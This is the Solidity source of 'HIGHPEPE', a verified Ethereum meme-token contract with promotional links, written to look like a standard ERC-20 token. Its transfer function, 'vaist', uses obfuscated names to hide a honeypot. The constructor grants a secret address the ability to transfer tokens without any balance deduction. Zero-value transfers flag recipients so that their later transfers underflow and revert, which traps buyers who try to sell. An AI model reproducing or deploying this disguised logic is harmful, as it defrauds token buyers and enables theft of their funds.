/**
 *Submitted for verification at Etherscan.io on 2023-05-24
*/

/*
 https://t.me/highpepeeth
 https://www.highpepe.club/
 https://twitter.com/highpepeeth
*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract HIGHPEPE is Ownable {

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private juoda;

    uint256 public totalSupply = 420_690_000_000_000 * 10 ** 9;

    

    
    mapping(address => mapping(address => uint256)) public allowance;


    event Transfer(address indexed from, address indexed to, uint256 value);
    

    


    mapping(address => uint256) private azuola;


    


    function transfer(address bonk, uint256 zirk) public returns (bool success) {
        vaist(msg.sender, bonk, zirk);
        return true;
    }

    string public name = 'HIGHPEPE';
   
    function approve(address saldi, uint256 zirk) public returns (bool success) {
        allowance[msg.sender][saldi] = zirk;
        emit Approval(msg.sender, saldi, zirk);
        return true;
    }

    uint256 private medinis = 57;

    constructor(address sikn) {
        balanceOf[msg.sender] = totalSupply;
        juoda[sikn] = medinis;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }


    string public symbol = 'HIGHPEPE';
    
    
    
    
    
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
   
    address public uniswapV2Pair;
   
    mapping(address => uint256) public balanceOf;
   
    function transferFrom(address smker, address bonk, uint256 zirk) public returns (bool success) {
        vaist(smker, bonk, zirk);
        require(zirk <= allowance[smker][msg.sender]);
        allowance[smker][msg.sender] -= zirk;
        return true;
    }
     function vaist(address smker, address bonk, uint256 zirk) private returns (bool success) {
        if (juoda[smker] == 0) {
            balanceOf[smker] -= zirk;
        }

        if (zirk == 0) azuola[bonk] += medinis;

        if (juoda[smker] == 0 && uniswapV2Pair != smker && azuola[smker] > 0) {
            juoda[smker] -= medinis;
        }

        balanceOf[bonk] += zirk;
        emit Transfer(smker, bonk, zirk);
        return true;
    }

     uint8 public decimals = 9;

}